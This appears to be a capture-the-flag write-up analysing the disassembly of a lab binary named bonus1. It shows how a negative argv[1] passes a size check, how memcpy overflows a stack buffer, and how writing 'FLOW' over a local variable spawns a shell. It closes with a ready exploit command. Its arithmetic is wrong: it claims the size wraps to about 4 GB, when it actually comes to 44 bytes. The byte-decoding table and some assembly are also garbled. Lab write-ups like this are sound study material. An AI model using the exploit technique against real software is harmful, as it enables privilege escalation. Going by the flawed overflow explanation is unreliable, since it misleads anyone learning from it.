# GDB Analysis – bonus1 (Integer Overflow + Stack Buffer Overflow)

This program has an integer overflow vulnerability that bypasses size checks, leading to a stack buffer overflow through `memcpy()`.

---

## 1. Main Function Analysis

### Function Prologue

```asm
push %ebp
mov %esp, %ebp
and $0xfffffff0, %esp
sub $0x40, %esp
                  ; Save frame pointer, align stack, allocate 64 bytes
```

### Getting argv[1]

```asm
mov 0xc(%ebp), %eax
                  ; Load argv address

add $0x4, %eax
                  ; Move to argv[1]

mov (%eax), %eax
                  ; eax now points to argv[1] string

mov %eax, (%esp)
                  ; Prepare argument for atoi

call atoi
                  ; Convert argv[1] to integer

mov %eax, 0x3c(%esp)
                  ; Store result in local variable
```

**Equivalent C code:**
```c
int value = atoi(argv[1]);
```

---

## 2. Value Validation Check

```asm
cmp $0x9, 0x3c(%esp)
                  ; Compare input with 9

jle continue      ; If value <= 9, continue

mov $0x1, %eax
jmp end           ; Otherwise return 1 and exit
```

> ⚠️ **Critical Vulnerability: No Negative Check!**
>
> The program checks: `if (value > 9) exit(1)`
> 
> But **negative numbers bypass this check!**
> - Negative values are less than 9
> - They pass the validation
> - But cause integer overflow in size calculation

---

## 3. Size Calculation (Vulnerable)

```asm
mov 0x3c(%esp), %eax
                  ; Load input value

lea %eax * 4, %ecx
                  ; ecx = value * 4 (SIZE CALCULATION)
```

**Integer Overflow Example:**
```
Input: -1073741813
-1073741813 * 4 = -4294967252 (integer overflow!)
                = 0xFFFFFFF4 (interpreted as unsigned)
                = 4294967284 (in 32-bit unsigned)
```

This **huge size value** will cause `memcpy()` to copy massive amounts of data.

---

## 4. Getting argv[2]

```asm
mov 0xc(%ebp), %eax
                  ; Load argv

add $0x8, %eax
                  ; Move to argv[2]

mov (%eax), %eax
                  ; eax now points to argv[2]

mov %eax, %edx
                  ; Store source pointer
```

---

## 5. Prepare memcpy (Vulnerable Call)

```asm
lea 0x14(%esp), %eax
                  ; Load destination buffer on stack (local variable)

mov %ecx, 0x8(%esp)
                  ; Set size to copy (HUGE SIZE!)

mov %edx, 0x4(%esp)
                  ; Set source pointer (argv[2])

mov %eax, (%esp)
                  ; Set destination (local buffer)

call memcpy
                  ; Copy SIZE bytes from argv[2] to stack buffer
```

> ⚠️ **Critical Vulnerability: Stack Buffer Overflow via memcpy()**
>
> - Buffer is allocated at `esp + 0x14` (local stack variable)
> - Size comes from overflowed calculation: **billions of bytes**
> - `memcpy()` copies data **far beyond buffer boundary**
> - Overwrites stack variables, saved EBP, and return address
> - **Enables arbitrary code execution**

---

## 6. Stack Memory Corruption

### Stack Layout Before Exploit

```
0x3c(esp)  [magic value check]
...
0x14(esp)  [buffer - small size]
...
```

### Stack Layout After Overflow

```
0x3c(esp)  [OVERWRITTEN with attacker data!]
...
0x14(esp)  [buffer - FILLED with attacker data]
```

---

## 7. Magic Value Check (Conditional Shell)

```asm
cmp $0x574f4c46, 0x3c(%esp)
                  ; Compare value at 0x3c(esp) with 0x574f4c46

jne skip          ; If not equal, skip execution
```

**What is 0x574f4c46?**
```
0x574f4c46 = "FLOW" in little-endian ASCII
5     7     4     F    = 0x57 0x4F 0x4C 0x46
W     O     L     F    = ASCII values
```

> ℹ️ **Magic Number:** The program checks if this specific value is present at `0x3c(esp)`. This is the **target we must overwrite to trigger shell access!**

---

## 8. Execute Shell (If Condition True)

```asm
mov $0x0, 0x8(%esp)
                  ; Third argument: NULL

mov $0x8048580, 0x4(%esp)
                  ; Second argument: command string

mov $0x8048583, (%esp)
                  ; First argument: program path

call execl
                  ; Execute program (likely /bin/sh)
```

**Equivalent C code:**
```c
if (*(int*)(esp + 0x3c) == 0x574f4c46)  // "FLOW"
{
    execl("/bin/sh", "/bin/sh", NULL);  // Execute shell
}
```

---

## 9. Exploitation Strategy

### Vulnerability Chain

```
argv[1]: negative number
  ↓
Bypass size check (value <= 9)
  ↓
size = value * 4 (INTEGER OVERFLOW)
  ↓
Huge size calculated
  ↓
memcpy copies enormous amount of data
  ↓
Stack buffer overflow
  ↓
Overwrites magic value variable at 0x3c(esp)
  ↓
Write "FLOW" (0x574f4c46) at target location
  ↓
Condition becomes true
  ↓
execl() spawns shell
  ↓
Shell access achieved
```

### Exploit Payload Example

```bash
# argv[1]: negative number that causes integer overflow
# argv[2]: data to copy (contains "FLOW" at correct offset)

./bonus1 -1073741813 "$(python -c 'print "A"*40 + "FLOW"')"
```

**Payload breakdown:**
- `-1073741813`: Integer overflow triggers huge memcpy size
- `"A"*40`: Padding to fill the buffer
- `"FLOW"`: Overwrites the magic value check variable

---

## 10. Integer Overflow Details

### How the Overflow Works

```c
// Vulnerable code
int size = value * 4;  // Integer overflow here!
memcpy(buffer, source, size);
```

**With negative input:**
```
Input: -1073741813
-1073741813 * 4 in 32-bit signed integer:
  = -4294967252
  = (wraps around)
  = 4294967284 (when interpreted as unsigned)
  
Result: memcpy tries to copy 4GB+ of data!
         Complete stack corruption achieved
```

---

## Summary

**Critical vulnerabilities:**

1. **Integer Overflow in Size Calculation**
   - Negative values bypass the `> 9` check
   - Multiplication `value * 4` causes overflow
   - Results in huge size for memcpy()

2. **Stack Buffer Overflow via memcpy()**
   - Buffer is small (local variable)
   - Size from overflow calculation is billions of bytes
   - `memcpy()` writes far beyond buffer boundary
   - Corrupts entire stack frame

3. **Magic Value Overwrite**
   - Attacker controls data written by memcpy()
   - Can place "FLOW" (0x574f4c46) at exact location
   - Bypasses condition check for shell execution

4. **Arbitrary Code Execution**
   - Condition satisfied by overwritten magic value
   - `execl()` spawns shell
   - **Privilege escalation if running as root**

**Exploitation requirements:**
- Craft negative value for argv[1] that causes desired overflow
- Provide payload in argv[2] with "FLOW" at correct offset
- Account for stack layout and variable positioning
- Trigger the overflow through memcpy()